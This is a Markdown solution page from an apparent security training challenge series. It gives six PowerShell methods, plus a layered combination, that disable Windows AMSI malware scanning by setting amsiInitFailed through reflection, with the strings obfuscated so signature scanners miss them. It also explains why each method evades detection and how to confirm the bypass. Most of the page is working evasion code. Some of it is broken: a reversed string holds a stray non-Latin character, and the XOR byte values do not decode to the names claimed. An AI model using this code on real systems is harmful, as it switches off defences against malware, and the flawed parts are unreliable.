---
title: "Solution 36: Obfuscated Reflection (Dynamic String Construction)"
challenge_number: 36
difficulty: hard
category: "AMSI Bypass"
permalink: /solutions/36-obfuscated-reflection/
---

# Solution: Obfuscated Reflection (Dynamic String Construction)

[Back to Challenge](../challenges/36-obfuscated-reflection.md)

## Overview

Perform the same amsiInitFailed reflection bypass as Challenge 31, but construct the type and field names dynamically at runtime using character codes. Neither `"AmsiUtils"` nor `"amsiInitFailed"` appear as contiguous strings anywhere in the file, defeating signature-based detection of the bypass itself.

## Working Code

### Method 1: Character Code Arrays

```powershell
# Build "AmsiUtils" from ASCII codes
$a = [char[]](65,109,115,105,85,116,105,108,115) -join ''  # "AmsiUtils"

# Build "amsiInitFailed" from ASCII codes
$b = [char[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100) -join ''  # "amsiInitFailed"

# Use the constructed strings for reflection
$type = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -eq $a }
$field = $type.GetField($b, 'NonPublic,Static')
$field.SetValue($null, $true)
```

### Method 2: String Reversal

```powershell
# Reversed strings - no signature match
$a = "slitUismA"[-1..-9] -join ''           # "AmsiUtils"
$b = "deliাFtinIisma"[-1..-14] -join ''      # "amsiInitFailed"

# Build the full type name
$prefix = "System.Management.Automation."
$type = [Ref].Assembly.GetType($prefix + $a)
$field = $type.GetField($b, 'NonPublic,Static')
$field.SetValue($null, $true)
```

### Method 3: XOR Decryption

```powershell
# XOR-encrypted strings (key = 0x42)
$encA = [byte[]](0x23,0x6F,0x31,0x2B,0x17,0x36,0x2B,0x2E,0x31)  # "AmsiUtils" ^ 0x42
$encB = [byte[]](0x23,0x2F,0x31,0x2B,0x0B,0x2C,0x2B,0x36,0x04,0x23,0x2B,0x2E,0x27,0x26)  # "amsiInitFailed" ^ 0x42

# Decrypt at runtime
$key = 0x42
$a = -join ($encA | ForEach-Object { [char]($_ -bxor $key) })
$b = -join ($encB | ForEach-Object { [char]($_ -bxor $key) })

$type = [Ref].Assembly.GetType("System.Management.Automation.$a")
$field = $type.GetField($b, 'NonPublic,Static')
$field.SetValue($null, $true)
```

### Method 4: Format String Assembly

```powershell
# Build strings using format operator
$a = "{0}{1}{2}" -f "Ams","iUt","ils"
$b = "{0}{1}{2}{3}" -f "amsi","Init","Fai","led"

$type = [Ref].Assembly.GetType("System.Management.Automation.$a")
$field = $type.GetField($b, 'NonPublic,Static')
$field.SetValue($null, $true)
```

### Method 5: Base64 Fragments

```powershell
# Each fragment is Base64 encoded separately
$a = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("QW1zaVV0aWxz"))  # "AmsiUtils"
$b = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("YW1zaUluaXRGYWlsZWQ="))  # "amsiInitFailed"

$type = [Ref].Assembly.GetType("System.Management.Automation.$a")
$field = $type.GetField($b, 'NonPublic,Static')
$field.SetValue($null, $true)
```

### Method 6: Environment Variable Stash

```powershell
# Store the strings in environment variables (set from another context)
[Environment]::SetEnvironmentVariable("_x1", "AmsiUtils", "Process")
[Environment]::SetEnvironmentVariable("_x2", "amsiInitFailed", "Process")

# Later, retrieve and use them
$type = [Ref].Assembly.GetType("System.Management.Automation.$env:_x1")
$field = $type.GetField($env:_x2, 'NonPublic,Static')
$field.SetValue($null, $true)
```

## Why It Works

### The Detection Problem

After Challenge 31 became widely known, AMSI providers (and file scanners) added signatures for the bypass itself:

```
Signature: "AmsiUtils"
Signature: "amsiInitFailed"
Signature: "GetField('amsiInitFailed"
```

If these strings appear literally in a script, AMSI blocks the bypass attempt before it can execute.

### The Obfuscation Solution

By constructing the strings at runtime from individual characters or encoded fragments, the file on disk never contains the target strings as contiguous byte sequences:

```
File bytes (Method 1):
... 65,109,115,105,85,116,105,108,115 ...

Scanner searches for:
"AmsiUtils" = bytes 41 6D 73 69 55 74 69 6C 73

What scanner actually finds:
"65,109,115,105,85,116,105,108,115" = bytes 36 35 2C 31 30 39 2C ...
```

The scanner sees the ASCII representation of decimal numbers (`"65,109,115..."`) not the actual character bytes that spell "AmsiUtils". The conversion only happens at runtime via `[char[]](...) -join ''`.

### Why Each Method Evades Detection

| Method | On-Disk Representation | Why No Match |
|--------|----------------------|--------------|
| Char codes | `65,109,115,105...` | Decimal numbers, not the characters themselves |
| Reversal | `"slitUismA"` | Backwards string doesn't match forward signature |
| XOR | `0x23,0x6F,0x31...` | Encrypted bytes bear no resemblance to plaintext |
| Format string | `"Ams","iUt","ils"` | Fragments too small to match; never contiguous |
| Base64 | `"QW1zaVV0aWxz"` | Base64 encoding obscures content |
| Env vars | `$env:_x1` | String comes from outside the file entirely |

### Layered Obfuscation

These methods can be combined:
```powershell
# XOR + reversal + char codes = three layers
$k = 7
$enc = @(72,100,126,104,24,123,104,109,126)  # reversed + XOR'd
$dec = ($enc | ForEach-Object { [char]($_ -bxor $k) }) -join ''
$final = $dec[-1..-($dec.Length)] -join ''
# $final = "AmsiUtils"
```

## How to Verify

1. Save Method 1 to a file:
   ```powershell
   $code = @'
   $a = [char[]](65,109,115,105,85,116,105,108,115) -join ''
   $b = [char[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100) -join ''
   $type = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -eq $a }
   $field = $type.GetField($b, 'NonPublic,Static')
   $field.SetValue($null, $true)
   Write-Host "Bypass applied"
   '@
   Set-Content -Path "test_obfuscated.ps1" -Value $code
   ```

2. Verify the file contains no target strings:
   ```powershell
   $content = Get-Content "test_obfuscated.ps1" -Raw
   Write-Host "Contains 'AmsiUtils': $($content -match 'AmsiUtils')"
   Write-Host "Contains 'amsiInitFailed': $($content -match 'amsiInitFailed')"
   # Both should be False
   ```

3. Run the scanner:
   ```
   nim_antimalware_sim.exe test_obfuscated.ps1
   ```
   Expected: **No detection** — signature strings don't exist in the file.

4. Execute the script and verify the bypass worked:
   ```powershell
   . .\test_obfuscated.ps1
   # Confirm the field is set
   $ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
   $f = $ref.GetField('amsiInitFailed','NonPublic,Static')
   Write-Host "amsiInitFailed = $($f.GetValue($null))"
   # Output: amsiInitFailed = True
   ```
